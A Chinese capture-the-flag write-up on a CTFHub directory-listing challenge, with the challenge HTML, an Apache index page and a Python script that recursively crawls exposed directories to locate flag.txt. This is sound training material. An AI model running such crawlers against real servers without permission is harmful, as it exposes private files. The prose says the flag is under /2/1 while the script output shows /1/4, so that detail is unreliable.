# CTFHUB_目录遍历

## 题目内容

```html
<html lang="en"><head>
    <meta charset="UTF-8">
    <title>CTFHub 技能学习 | 目录遍历</title>
    <link rel="stylesheet" href="static/bootstrap.min.css">
    <script src="static/jquery.min.js"></script>
    <script src="static/popper.min.js"></script>
    <script src="static/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="jumbotron text-center">
            <h1>目录遍历</h1>
            <a href="flag_in_here/" class="btn btn-success">点击开始寻找flag</a>
        </div>
    </div>
</body></html>
```



## WriteUp
点击按钮即可跳转到flag_in_here目录

打开后是一个非常经典的目录遍历

```
Index of /flag_in_here
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[DIR]	1/	2021-08-21 12:36	-	 
[DIR]	2/	2021-08-21 12:36	-	 
[DIR]	3/	2021-08-21 12:36	-	 
[DIR]	4/	2021-08-21 12:36	-	 
Apache/2.4.38 (Debian) Server at challenge-99c7c4b3464b09ca.sandbox.ctfhub.com Port 10800
```

手动寻找可以找到在/2/1目录下有flag.txt,但是这样的寻找方式太过于麻烦，故使用python编写脚本

```python
# 用于列出目录遍历漏洞下所有文件
# admin@e-wolf.top
import requests
from bs4 import BeautifulSoup


def get_dir_list(vuln_url): 
    # 获取requests信息
    dir_get = requests.get(url=vuln_url)
    # 处理返回原始信息，方便使用html5解析
    soup_get = BeautifulSoup(dir_get.text, 'html5lib')
    # 初始化目录列表
    dir_list = []
    # 遍历获取第一级目录
    for i in soup_get.find_all('a'):
        href = i['href']
        if i.string == "Parent Directory":
            # 筛去父目录以及以上的href,到了当前目录重置dir_lis
            # t并跳出当前循环
            dir_list = []
            continue
        dir_list.append(href)
    # 递归
    for dir in dir_list:
        print(vuln_url+dir)
        get_dir_list(vuln_url+dir)


# 获取漏洞地址
#vuln_url = input("Vuln URL ==>")
vuln_url = "http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/"
get_dir_list(vuln_url)
```

同用脚本，返回结果如下

```
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/1/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/1/1/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/1/2/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/1/3/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/1/4/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/1/4/flag.txt
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/2/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/2/1/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/2/2/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/2/3/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/2/4/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/3/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/3/1/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/3/2/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/3/3/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/3/4/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/4/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/4/1/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/4/2/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/4/3/
http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/4/4/
```

